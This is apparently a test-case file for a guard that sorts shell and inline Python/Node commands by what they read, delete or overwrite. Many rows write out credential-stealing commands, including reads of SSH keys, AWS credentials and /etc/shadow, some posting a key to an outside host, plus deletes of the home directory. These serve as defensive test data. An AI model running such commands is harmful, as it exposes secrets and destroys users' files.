# Inline reads of keys: code that reads a key is a read of it
# (`read_secret`), as the shell command that reads the same file is; so is a
# read of a path that starts in a folder of keys. A delete or a write to a
# path the reader cannot work out is judged as `rm -rf "$DIR"` is: a place
# unknown. A read fails closed the same way: code that opens a file whose
# path the guard does not fully know (a call or a name it does not follow,
# the command line, a loop or a listing, a `%` or `format` of a part that is
# not a literal, a name bound another way than to a string, a spread in a
# join, a call it has no row for) is `unknown`, unless the part it does know
# already lies in a place that holds a key. A key handed to a started
# program is read as the program reads it. Only code the reader fully
# understands is safe. The format is in CONTRIBUTING.md.

# Inline code that reads a key is a read of it, and one it cannot follow is
# unknown.
# A file that is no secret, when the code gives the whole path, is no read of
# one: a path the code gives whole is read as `cat` reads it.
posix safe | python3 -c "print(open('README.md').read())"
posix safe | python3 -c "print(open('/etc/hosts').read())"
posix safe | python3 -c "k='/home/me/work/repo/ok.txt'; print(open(k).read())"
# Written to a file of the workspace, not read.
posix safe | python3 -c "open('/home/me/work/repo/out.txt', 'w').write('x')"
# `add` and `write` of any other object are no read of a path, and the code
# is plain statements and calls on the list.
posix safe | python3 -c "s = set(); s.add('/home/me/.ssh/id_rsa')"
posix safe | python3 -c "f = open('out.txt', 'w'); f.write('/home/me/.ssh/id_rsa')"
# What only looks at a name opens nothing, and a path given to it is no
# reason to doubt the line.
posix safe | python3 -c "print('/tmp/x'.split('/'))"
posix safe | python3 -c "s = set(); s.add('/tmp/x'); print(s)"
posix safe | node -e "console.log('/tmp/x'.split('/'))"
# Names bound whole, however many times, are still read.
posix safe | python3 -c "x = 'a.txt'\nprint(open(x).read())"
posix safe | python3 -c "x = 'a.txt'\nx = 'b.txt'\nprint(open(x).read())"
posix safe | python3 -c "x = 'a.txt'\ny = x + '.bak'\nprint(open(y).read())"
posix safe | python3 -c "x = y = 'a.txt'\nprint(open(x).read())"
# What touches nothing stays safe.
posix safe | python3 -c "print(sorted({'b': 1, 'a': 2}.items()), 'a,b'.split(','))"
# A path that starts in a folder with no key, as the shell reads it.
posix safe | cat /home/me/work/repo/$n
posix safe | cat ~/$n
# A path only known when the code runs (the command line, the input) is a
# file the guard cannot name, whatever the line hands the code: the read is
# `unknown`, as the same path is a delete of a place unknown for `rm`.
# (`json` is a file looked up in the folder first: unknown.)
posix finds=unknown | python3 -c "import json; print(json.load(open('package.json')))"
posix finds=unknown | python3 -c "import sys; print(open(sys.argv[1]).read())"
posix finds=unknown | python3 -c "key = input(); print(open(key).read())"
posix finds=unknown | node -e "require('fs').readFileSync(process.argv[1])"
# The shell reads of the same files, which the code's own are judged as
# (`cat ~/.ssh/id_rsa` is in read_secret.cases).
posix finds=read_secret | cp ~/.ssh/id_rsa keys/
posix finds=read_secret | python3 -c "print(open('/home/me/.ssh/id_rsa', 'rb').read())"
posix finds=read_secret | python3 -c "import os; print(open(os.path.expanduser('~/.ssh/id_rsa')).read())"
posix finds=read_secret | python3 -c "with open('/home/me/.ssh/id_rsa') as f: print(f.read())"
posix finds=read_secret | python3 -c "from pathlib import Path; print((Path.home() / '.ssh/id_rsa').read_text())"
posix finds=read_secret | python3 -c "from pathlib import Path; print(Path('/home/me/.aws/credentials').read_bytes())"
posix finds=read_secret | python3 -c "from pathlib import Path; Path('/home/me/.ssh/id_rsa').open().read()"
posix finds=read_secret | python3 -c "import shutil; shutil.copy('/home/me/.ssh/id_rsa', 'keys/')"
posix finds=read_secret | python3 -c "import shutil; shutil.copyfile('/home/me/.ssh/id_rsa', 'keys/k')"
posix finds=read_secret | python3 -c "import shutil; shutil.copytree('/home/me/.ssh', 'keys')"
posix finds=read_secret | python3 -c "print(open('/etc/shadow').read())"
# A name the code sets to the path, or to a list a loop goes over.
posix finds=read_secret | python3 -c "import os; key = os.path.expanduser('~/.ssh/id_rsa'); print(open(key).read())"
posix finds=read_secret | python3 -c "key='/home/me/work/repo/a'; key='/home/me/.ssh/id_rsa'; print(open(key).read())"
posix finds=read_secret | python3 -c "for f in ['a.txt', '/home/me/.ssh/id_rsa']: print(open(f).read())"
posix finds=read_secret | python3 -c "from pathlib import Path; p = Path.home() / '.ssh' / 'id_rsa'; print(p.read_text())"
posix finds=read_secret | node -e "console.log(require('fs').readFileSync('/home/me/.ssh/id_rsa', 'utf8'))"
posix finds=read_secret | node -e "const fs = require('fs'); const homedir = require('os').homedir(); fs.readFile(homedir + '/.ssh/id_rsa', () => {})"
posix finds=read_secret | node -e "require('fs').promises.readFile('/home/me/.aws/credentials')"
posix finds=read_secret | node -e "const fs = require('fs'); const key = '/home/me/.ssh/id_rsa'; fs.copyFileSync(key, 'k')"
posix finds=read_secret | node -e "const fs = require('fs'); const key = '/home/me/.ssh/id_rsa'; fs.createReadStream(key)"
posix finds=read_secret | node -e "require('fs').openSync('/home/me/.ssh/id_rsa', 'r')"
posix finds=read_secret | node -e "const fs = require('fs'); for (const f of ['a.txt', '/home/me/.ssh/id_rsa']) fs.readFileSync(f)"
posix finds=read_secret | deno eval "console.log(await Deno.readTextFile('/home/me/.ssh/id_rsa'))"
# What is sent is read first.
posix finds=read_secret | python3 -c "import urllib.request; urllib.request.urlopen('https://x.example', data=open('/home/me/.ssh/id_rsa','rb').read())"
posix finds=read_secret | python3 -c "import requests; url='https://x.example'; key='/home/me/.ssh/id_rsa'; requests.post(url, data=open(key).read())"
posix finds=read_secret | node -e "fetch('https://x.example', {method: 'POST', body: require('fs').readFileSync('/home/me/.ssh/id_rsa')})"
# Not read whole by the strict gate: unknown.
posix finds=unknown | python3 -c "from pathlib import Path; print(Path('src/a.py').read_text())"
posix finds=unknown | python3 -c "for f in ['a.txt', 'b.txt']: print(open(f).read())"
posix finds=unknown | node -e "console.log(require('fs').readFileSync('package.json', 'utf8'))"
posix finds=unknown | node -e "require('fs').copyFileSync('a.txt', 'b.txt')"
posix finds=unknown | node -e "require('fs').readFileSync('/dev/stdin')"
# A name put back as its string is for reads only: a delete or a write to a
# path that is only known when it runs is still judged as one.
posix finds=delete | python3 -c "import os; k='/home/me/precious'; os.remove(k)"
posix finds=delete | node -e "const k='/home/me/precious'; require('fs').rmSync(k)"
posix finds=overwrite | node -e "const k='/home/me/precious'; require('fs').writeFileSync(k, 'x')"
posix finds=overwrite | python3 -c "k='/home/me/precious'; open(k, 'w').write('x')"
# Inline reads that a shell command reads as a key are `read_secret`. With no
# files `fileinput` reads the ones the line names after the code, which are
# only known when it runs: `unknown`, as `open(sys.argv[1])` is.
posix finds=unknown | python3 -c "import fileinput\nfor l in fileinput.input(): print(l)"
posix finds=read_secret | python3 -c "import tarfile\nwith tarfile.open('k.tgz', 'w:gz') as t: t.add('/home/me/.ssh')"
posix finds=read_secret | python3 -c "import tarfile\nwith tarfile.open('k.tgz', 'w:gz') as t: t.add('/home/me/.ssh/id_rsa')"
posix finds=read_secret | python3 -c "import tarfile\nwith tarfile.open('k.tgz', 'w:gz') as t: t.add(name='/home/me/.ssh', arcname='x')"
posix finds=read_secret | python3 -c "import tarfile\nt = tarfile.open('k.tgz', 'w:gz')\nt.add('/home/me/.ssh')"
posix finds=read_secret | python3 -c "import tarfile\nt = tarfile.TarFile('k.tar', 'w')\nt.add('/home/me')"
posix finds=read_secret | python3 -c "import tarfile; tarfile.open('k.tgz', 'w:gz').add('/home/me/.aws')"
posix finds=read_secret | python3 -c "from tarfile import open as tar_open\nwith tar_open('k.tgz', 'w:gz') as t: t.add('/home/me/.ssh')"
posix finds=read_secret | python3 -c "import zipfile\nwith zipfile.ZipFile('k.zip', 'w') as z: z.write('/home/me/.ssh/id_rsa')"
posix finds=read_secret | python3 -c "import zipfile\nz = zipfile.ZipFile('k.zip', 'w')\nz.write(filename='/home/me/.aws/credentials')"
posix finds=read_secret | python3 -c "import shutil; shutil.make_archive('k', 'gztar', root_dir='/home/me', base_dir='.ssh')"
posix finds=read_secret | python3 -c "import shutil; shutil.make_archive('k', 'gztar', '/home/me', '.ssh')"
posix finds=read_secret | python3 -c "import shutil; shutil.make_archive('k', 'gztar', root_dir='/home/me/.ssh')"
posix finds=read_secret | python3 -c "import shutil; shutil.make_archive('k', 'gztar', base_dir='/home/me/.ssh')"
posix finds=read_secret | python3 -c "import shutil; shutil.make_archive('k', 'gztar', root_dir='/home/me')"
posix finds=read_secret | python3 -c "import shutil; shutil.copytree('/home/me', 'copy')"
posix finds=read_secret | python3 -c "import fileinput\nfor l in fileinput.input(['/home/me/.ssh/id_rsa']): print(l)"
posix finds=read_secret | python3 -c "import fileinput\nfor l in fileinput.input(files=['/home/me/.ssh/id_rsa']): print(l)"
posix finds=read_secret | python3 -c "import fileinput\nfor l in fileinput.input(('a.txt', '/home/me/.ssh/id_rsa')): print(l)"
posix finds=read_secret | python3 -c "import fileinput\nfor l in fileinput.input('/home/me/.ssh/id_rsa'): print(l)"
posix finds=read_secret | python3 -c "import fileinput\nfor l in fileinput.FileInput(['/home/me/.ssh/id_rsa']): print(l)"
posix finds=read_secret | python3 -c "import linecache; print(linecache.getline('/home/me/.ssh/id_rsa', 1))"
posix finds=read_secret | python3 -c "import linecache; print(linecache.getlines('/home/me/.ssh/id_rsa'))"
posix finds=read_secret | python3 -c "import linecache; print(linecache.getline(filename='/home/me/.netrc', lineno=1))"
posix finds=read_secret | python3 -c "import configparser; c = configparser.ConfigParser(); c.read('/home/me/.aws/credentials')"
posix finds=read_secret | python3 -c "import configparser\nc = configparser.RawConfigParser()\nc.read(['a.ini', '/home/me/.aws/credentials'])"
posix finds=read_secret | python3 -c "import configparser\nc = configparser.ConfigParser()\nc.read(filenames='/home/me/.aws/credentials')"
posix finds=read_secret | python3 -c "from configparser import ConfigParser\nwith open('x') as f: pass\nConfigParser().read('/home/me/.aws/credentials')"
posix finds=read_secret | python3 -c "import netrc; print(netrc.netrc().hosts)"
posix finds=read_secret | python3 -c "import netrc; print(netrc.netrc(None).hosts)"
posix finds=read_secret | python3 -c "import netrc; print(netrc.netrc('/home/me/.netrc'))"
posix finds=read_secret | python3 -c "from netrc import netrc\nprint(netrc(file='/home/me/.netrc'))"
# The shell reads each of these the same way.
posix finds=read_secret | tar -cf k.tar /home/me/.ssh
posix finds=read_secret | zip k.zip /home/me/.ssh/id_rsa
posix finds=read_secret | cp -r /home/me/.ssh keys
posix finds=read_secret | cat /home/me/.netrc
# An inline read of a path that starts in a key folder is `read_secret`:
# `cat /home/me/.ssh/$n` is a read of a key whatever `$n` is; so is code that
# reads a path that starts there and ends in something only known when it
# runs.
posix finds=read_secret | cat /home/me/.ssh/$n
# A path that starts in a folder with no key, or in none the code gives, and
# ends in something only known when it runs, is a file the guard cannot
# name: `os.listdir` lists the dotfiles too, so a workspace with a `.netrc`
# makes `~/` + each name a read of it, as `for f in .*; do cat ~/"$f"; done`
# is one. Nothing is a finding of a key here, so each is `unknown`.
posix finds=unknown | python3 -c "import os\nfor n in os.listdir('/home/me/work/repo'): print(open('/home/me/work/repo/' + n).read())"
posix finds=unknown | python3 -c "import os\nfor n in os.listdir('.'): print(open(os.path.join('/home/me/work/repo', n)).read())"
posix finds=unknown | python3 -c "import pathlib; [print(p.read_text()) for p in pathlib.Path('/home/me/work/repo').glob('*.py')]"
posix finds=unknown | python3 -c "import pathlib\nfor p in pathlib.Path('src').iterdir(): print(p.read_text())"
posix finds=unknown | python3 -c "import glob\nfor f in glob.glob('src/*.py'): print(open(f).read())"
posix finds=unknown | python3 -c "import glob\nfor f in glob.glob('*.py'): print(open(f).read())"
posix finds=unknown | python3 -c "import os\nfor n in os.listdir('.'): print(open(os.path.join(os.path.expanduser('~'), n)).read())"
posix finds=unknown | python3 -c "n = input(); print(open(n + '/x').read())"
posix finds=unknown | python3 -c "n = input(); print(open('/etc/' + n).read())"
posix finds=unknown | node -e "const fs = require('fs'); fs.readdirSync('src').forEach(f => console.log(fs.readFileSync('src/' + f, 'utf8')))"
posix finds=unknown | node -e "const fs = require('fs'); const f = process.argv[1]; fs.readFileSync(f + '.txt')"
# The same from a folder of keys is a read of a key.
posix finds=read_secret | python3 -c "import os\nfor n in os.listdir('/home/me/.ssh'): print(open('/home/me/.ssh/' + n).read())"
posix finds=read_secret | python3 -c "import pathlib; [print(p.read_text()) for p in pathlib.Path('/home/me/.ssh').glob('id_*')]"
posix finds=read_secret | python3 -c "import pathlib\nfor p in pathlib.Path('/home/me/.ssh').iterdir(): print(p.read_text())"
posix finds=read_secret | python3 -c "import pathlib\nfor p in sorted(pathlib.Path('/home/me/.ssh').rglob('*')): print(p.read_bytes())"
posix finds=read_secret | python3 -c "from pathlib import Path\nfor p in Path.home().joinpath('.ssh').glob('*'): print(open(p).read())"
posix finds=read_secret | python3 -c "import glob\nfor f in glob.glob('/home/me/.ssh/*'): print(open(f).read())"
posix finds=read_secret | python3 -c "import glob\nfor f in glob.iglob('/home/me/.aws/*'): print(open(f).read())"
posix finds=read_secret | python3 -c "import os\nfor n in os.listdir('/home/me/.ssh'): print(open(os.path.join('/home/me/.ssh', n)).read())"
posix finds=read_secret | python3 -c "import os\nfor n in os.listdir('/home/me/.ssh'): print(open(os.path.expanduser('~/.ssh/') + n).read())"
posix finds=read_secret | python3 -c "from pathlib import Path\nfor n in input().split(): print((Path.home() / '.ssh' / n).read_text())"
posix finds=read_secret | python3 -c "from pathlib import Path\nn = input()\nprint(Path('/home/me/.ssh').joinpath(n).read_text())"
posix finds=read_secret | python3 -c "n = input(); print(open('/home/me/.ssh/id_' + n).read())"
posix finds=read_secret | python3 -c "n = input(); print(open(f'/home/me/.ssh/{n}').read())"
posix finds=read_secret | python3 -c "n = input(); print(open('/home/me/.ssh/%s' % n).read())"
posix finds=read_secret | python3 -c "n = input(); print(open('/home/me/.ssh/{}'.format(n)).read())"
posix finds=read_secret | python3 -c "n = input(); print(open('/'.join(['/home/me/.ssh', n])).read())"
posix finds=read_secret | python3 -c "n = input(); d = '/home/me/.ssh/'; print(open(d + n).read())"
posix finds=read_secret | python3 -c "import shutil; n = input(); shutil.copy('/home/me/.ssh/' + n, 'keys/')"
posix finds=read_secret | node -e "const fs = require('fs'); fs.readdirSync('/home/me/.ssh').forEach(f => console.log(fs.readFileSync('/home/me/.ssh/' + f, 'utf8')))"
posix finds=read_secret | node - <<'JS'\nconst fs = require('fs');\nconst f = process.argv[1];\nconsole.log(fs.readFileSync(`/home/me/.ssh/${f}`, 'utf8'));\nJS
posix finds=read_secret | node - <<'JS'\nconst fs = require('fs');\nconst path = require('path');\nconst f = process.argv[1];\nfs.readFileSync(path.join('/home/me/.ssh', f));\nJS
posix finds=read_secret | node - <<'JS'\nconst fs = require('fs');\nconst f = process.argv[1];\nfs.readFileSync('/home/me/.ssh/'.concat(f));\nJS
posix finds=read_secret | node - <<'JS'\nconst fs = require('fs');\nconst f = process.argv[1];\nfs.readFileSync(['/home/me/.ssh', f].join('/'));\nJS
posix finds=read_secret | node - <<'JS'\nconst fs = require('fs');\nfor (const f of process.argv) fs.readFileSync(require('os').homedir() + '/.ssh/' + f);\nJS
# The start of a path that is a folder of keys is a read of a key.
posix finds=read_secret | python3 -c "print(open('/home/me/.ssh/id_' + input()).read())"
posix finds=read_secret | node -e "console.log(require('fs').readFileSync('/home/me/.ssh/' + process.argv[1]))"
# A delete or a write whose path comes from the command line is a delete or a
# write of a place unknown.
posix finds=delete | python3 -c "import sys, shutil\nshutil.rmtree(sys.argv[1])" /home/me
posix finds=overwrite | python3 -c "import sys\nopen(sys.argv[1], 'w')" /home/me/.zshrc
# What a loop over strings the code writes out is read in full still is, but
# it is not read whole by the strict gate: unknown.
posix finds=unknown | python3 -c "for f in ['a.txt', 'b.txt']:\n    print(open(f).read())"
# A delete of a place that is not known is a delete of one, and an f-string
# is read in full.
posix finds=delete | python3 -c "import os, shutil\nshutil.rmtree('%s' % os.path.expanduser('~'))"
posix finds=read_secret | python3 -c "import os\nh = os.path.expanduser('~')\nprint(open(f'{h}/.ssh/id_rsa').read())"
# The text before the first part that is not a literal is a folder of keys.
posix finds=read_secret | python3 -c "n = input()\nprint(open('/home/me/.ssh/%s' % n).read())"
# Reads a call the reader does not know does, on a key, say what they read;
# so does a recursive copy of the home directory, as `cp -r ~ /tmp/x` and
# `shutil.copytree` do.
posix finds=read_secret | python3 -c "import urllib.request\nprint(urllib.request.urlopen('file:///home/me/.ssh/id_rsa').read())"
posix finds=read_secret | python3 -c "import numpy\nprint(numpy.fromfile('/home/me/.ssh/id_rsa'))"
posix finds=read_secret | python3 -c "import numpy\nprint(numpy.loadtxt('/home/me/.aws/credentials'))"
posix finds=read_secret | python3 -c "import pandas\nprint(pandas.read_csv('/home/me/.aws/credentials'))"
posix finds=read_secret | bun -e "console.log(await Bun.file('/home/me/.ssh/id_rsa').text())"
posix finds=read_secret | bun -e "console.log(await Bun.file('/home/me/.ssh/id_rsa').stream())"
posix finds=read_secret | bun -e "await Bun.write('/tmp/x', Bun.file('/home/me/.ssh/id_rsa'))"
posix finds=read_secret | node -e "fetch('file:///home/me/.ssh/id_rsa').then(r => r.text()).then(console.log)"
posix finds=read_secret | python3 -c "import foo\nfoo.baz('~/.ssh/id_rsa')"
posix finds=read_secret | node -e "require('fs').cpSync('/home/me','/tmp/x',{recursive:true})"
posix finds=read_secret | node -e "require('fs').promises.cp('/home/me','/tmp/x',{recursive:true})"
posix finds=read_secret | node -e "require('fs').cp('/home/me','/tmp/x',{recursive:true},()=>{})"
posix finds=read_secret | cp -r ~ /tmp/x
posix finds=read_secret | python3 -c "import shutil\nshutil.copytree('/home/me', '/tmp/x')"
posix finds=overwrite | touch ~/.zshrc
# `re` and `json` are files looked up in the folder first: unknown, whatever
# path they are given.
posix finds=unknown | python3 -c "import re; print(re.sub('/+', '/', '/a//b'))"
posix finds=unknown | python3 -c "import json; print(json.dumps({'a': '/tmp/x'}))"
# A call to the network is a call the reader has no row for, with or without
# a path; so is a path outside the workspace given to `sys.path`, where an
# import looks for code.
posix finds=unknown | python3 -c "import sys; sys.path.insert(0, '/opt/lib'); print(sys.path)"
posix finds=unknown | python3 -c "import urllib.request; print(urllib.request.urlopen('https://example.com').status)"
posix finds=unknown | node -e "fetch('https://example.com').then(r => console.log(r.status))"
# What only looks at a name, or asks for the metadata of a file, opens
# nothing, but is not read whole by the strict gate: unknown.
posix finds=unknown | python3 -c "import os; print(os.listdir('.'))"
posix finds=unknown | python3 -c "import os; print(os.path.exists('/tmp/x'))"
posix finds=unknown | python3 -c "import os; print(os.path.join('/tmp', 'x'))"
posix finds=unknown | python3 -c "import os; print(os.stat('/tmp').st_mode)"
posix finds=unknown | python3 -c "import sys; sys.path.insert(0, 'lib'); print(sys.path)"
posix finds=unknown | python3 -c "import shutil; print(shutil.disk_usage('/'))"
posix finds=unknown | python3 -c "import os; print(os.environ.get('HOME', '/root'))"
posix finds=unknown | python3 -c "from pathlib import Path; print(Path('/tmp/x').exists())"
posix finds=unknown | node -e "console.log(require('os').homedir())"
posix finds=unknown | node -e "console.log(require('path').join('/a', 'b'))"
posix finds=unknown | node -e "console.log(require('fs').existsSync('/tmp/x'))"
posix finds=unknown | node -e "console.log(require('fs').readdirSync('/tmp'))"
posix finds=unknown | bun -e "console.log(await Bun.file('package.json').text())"
# A Python name bound another way than to a string: every choice that is a
# key is a read of one.
posix finds=read_secret | python3 -c "import sys\nx = '/home/me/.ssh/id_rsa'\nx = sys.argv[1]\nprint(open(x).read())"
posix finds=read_secret | python3 -c "import sys\nx = '/home/me/.ssh/id_rsa'\nx = sys.argv[1]\nprint(open(x + '').read())"
# Names bound whole, however many times, are still read.
posix finds=read_secret | python3 -c "x = 'a.txt'\nx = '/home/me/.ssh/id_rsa'\nprint(open(x).read())"
posix finds=read_secret | python3 -c "for x in ['a.txt', '/home/me/.ssh/id_rsa']:\n print(open(x).read())"
# Not read whole by the strict gate: unknown.
posix finds=unknown | python3 -c "for x in ['a.txt', 'b.txt']:\n print(open(x).read())"
posix finds=unknown | python3 -c "def f():\n return 1\nx = 'a.txt'\nprint(open(x).read(), f())"
# A JavaScript name bound another way than to a string: the rows below are
# unchanged by the rebinding, no name in them is.
posix finds=read_secret | node -e "let x = 'a.txt'; x = '/home/me/.ssh/id_rsa'; console.log(require('fs').readFileSync(x, 'utf8'))"
posix finds=read_secret | node -e "let x = '/home/me/.ssh/id_rsa'; x = process.argv[1]; console.log(require('fs').readFileSync(x, 'utf8'))"
# Not read whole by the strict gate: unknown.
posix finds=unknown | node -e "let x = 'a.txt'; console.log(require('fs').readFileSync(x, 'utf8'))"
posix finds=unknown | node -e "var x = 'a.txt'; var x = 'b.txt'; console.log(require('fs').readFileSync(x, 'utf8'))"
posix finds=unknown | node -e "for (const x of ['a.txt', 'b.txt']) console.log(require('fs').readFileSync(x, 'utf8'))"
# A spread in a path join: where the start the spread comes after is a
# folder of keys, the read is of one.
posix finds=read_secret | python3 -c "import sys, os\nprint(open(os.path.join('/home/me/.ssh', *sys.argv[1:])).read())"
posix finds=read_secret | python3 -c "import sys, pathlib\nprint(pathlib.Path('/home/me/.ssh').joinpath(*sys.argv[1:]).read_text())"
posix finds=read_secret | node -e "const p = require('path'); console.log(require('fs').readFileSync(p.join('/home/me/.ssh', ...process.argv.slice(1)), 'utf8'))"
# A join with no spread is read whole, but not by the strict gate: unknown.
posix finds=unknown | python3 -c "import os\nprint(open(os.path.join('src', 'a.txt')).read())"
posix finds=unknown | node -e "const p = require('path'); console.log(require('fs').readFileSync(p.join('src', 'a.txt'), 'utf8'))"
# A path handed to a call the reader has no row for that is a key is a read
# of one.
posix finds=read_secret | node -e "const F = require('foo'); F('/home/me/.ssh/id_rsa')"
posix finds=read_secret | node -e "new (require('foo').X)('/home/me/.ssh/id_rsa')"
# What touches nothing, but imports or calls what is not on the list, is not
# read whole by the strict gate: unknown.
posix finds=unknown | python3 -c "import re, math; print(re.sub('a', 'b', 'aaa'), math.sqrt(2))"
posix finds=unknown | python3 -c "import json, os; print(json.dumps({'cwd': os.getcwd()}))"
posix finds=unknown | python3 -c "import datetime; print(datetime.datetime.now().isoformat())"
posix finds=unknown | python3 -c "import os; print(os.path.join('a', 'b'), os.environ.get('X'), len(os.listdir('.')))"
posix finds=unknown | python3 -c "import sys, time; sys.stdout.write('x'); time.sleep(0)"
posix finds=unknown | python3 -c "def f(n):\n return n + 1\nclass C:\n def run(self):\n  return f(1)\nprint(f(1), C().run())"
posix finds=unknown | python3 -c "from pathlib import Path; p = Path('src'); print(p.exists(), p.name, p / 'a')"
posix finds=unknown | python3 -c "import sys; sys.path.insert(0, '.'); sys.path.append('src')"
posix finds=unknown | python3 -c "print((lambda n: n + 1)(2))"
posix finds=unknown | python3 -c "import functools\nclass A:\n @property\n def x(self): return 1\n @staticmethod\n @functools.lru_cache(maxsize=None)\n def y(): return 2\nprint(A().x, A.y())"
posix finds=unknown | node -e "console.log(require('os').platform(), require('path').join('a', 'b'))"
posix finds=unknown | node -p "process.version"
posix finds=unknown | node -e "console.log([1, 2].map(n => n * 2).join(','), JSON.stringify({a: 1}), Object.keys({a: 1}))"
posix finds=unknown | node -e "function f(n) { return n + 1 }; class C { run() { return f(1) } }; console.log(f(1), new C().run(), new Map(), new Date().toISOString())"
posix finds=unknown | node -e "const p = new Promise(r => setTimeout(r, 1)); p.then(() => console.log(1))"
posix finds=unknown | node -e "console.log(String(1), Number('2'), parseInt('3'), Math.max(1, 2), process.cwd())"
# An archive, a `fileinput`, a `linecache`, a `configparser` or a `netrc` of
# a file that is no key, or no name for one, and `read` or `add` of any other
# object: an import off the list is not read whole by the strict gate,
# unknown.
posix finds=unknown | python3 -c "import tarfile\nwith tarfile.open('k.tgz', 'w:gz') as t: t.add('src')"
posix finds=unknown | python3 -c "import tarfile; tarfile.open('k.tgz', 'w:gz').add('README.md')"
posix finds=unknown | python3 -c "import zipfile\nwith zipfile.ZipFile('k.zip', 'w') as z: z.write('a.txt')"
posix finds=unknown | python3 -c "import shutil; shutil.make_archive('k', 'gztar', root_dir='src')"
posix finds=unknown | python3 -c "import shutil; shutil.make_archive('k', 'gztar', 'src', 'lib')"
posix finds=unknown | python3 -c "import shutil; shutil.make_archive('k', 'gztar')"
posix finds=unknown | python3 -c "import fileinput\nfor l in fileinput.input(['a.txt', 'b.txt']): print(l)"
posix finds=unknown | python3 -c "import linecache; print(linecache.getline('a.py', 1))"
posix finds=unknown | python3 -c "import linecache; print(linecache.getlines('a.py'))"
posix finds=unknown | python3 -c "import configparser; c = configparser.ConfigParser(); c.read('setup.cfg')"
posix finds=unknown | python3 -c "import configparser; c = configparser.ConfigParser(); c.read(['a.ini', 'b.ini'])"
posix finds=unknown | python3 -c "import netrc; print(netrc.netrc('x.netrc').hosts)"
posix finds=unknown | python3 -c "import io; f = io.StringIO('x'); print(f.read())"
posix finds=unknown | python3 -c "import tarfile\nt = tarfile.open('k.tgz')\nu = set()\nu.add('/home/me/.ssh/id_rsa')"
